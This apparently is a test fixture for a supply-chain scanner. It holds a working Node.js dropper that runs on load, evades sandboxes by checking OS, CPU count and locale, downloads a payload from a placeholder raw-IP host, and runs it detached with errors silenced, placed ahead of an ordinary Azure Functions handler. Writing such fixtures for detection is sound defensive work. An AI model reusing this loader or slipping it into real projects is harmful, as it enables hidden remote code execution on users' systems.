// BAD: Node.js port of the durabletask dropper pattern.
//
// Tier 2 issues this file should trigger:
//   - SC-101: module-load side effect (executes at require time)
//   - SC-102: fetch-then-execute (downloads remote content + spawns child to run it)
//   - SC-103: silent error suppression with empty catch
//   - SC-104: raw IP host in URL (160.119.64.3 style — TLS-cert-issued recent domain)
//   - SC-108: anti-analysis gate (only run on Linux + skip Russian locale + CPU > 2)
//
// This file is fixture content for doctor's --deep checks. It does NOT
// actually download anything: the URL is a non-routable example. Do not
// uncomment the actual write/spawn lines for real testing.
const https = require('https');
const fs = require('fs');
const os = require('os');
const { spawn } = require('child_process');

(function dropper() {
  try {
    // SC-108: Linux-only + skip low-CPU sandboxes + skip Russian locale
    if (os.platform() !== 'linux') return;
    if (os.cpus().length <= 2) return;
    const lang = (process.env.LANG || '').toLowerCase();
    if (lang.startsWith('ru')) return;

    // SC-104: hardcoded raw IP "C2" host
    const url = 'https://192.0.2.42/payload.bin';

    // SC-102: fetch then execute
    const file = fs.createWriteStream('/tmp/managed.pyz');
    https.get(url, (res) => {
      res.pipe(file);
      file.on('finish', () => {
        file.close(() => {
          const child = spawn('node', ['/tmp/managed.pyz'], {
            detached: true,
            stdio: 'ignore',
          });
          child.unref();
        });
      });
    });
  } catch {
    // SC-103: silent failure
  }
})();

const { app } = require('@azure/functions');

app.http('hello', {
  methods: ['GET'],
  authLevel: 'function',
  handler: async (request, context) => ({ body: 'hello' }),
});
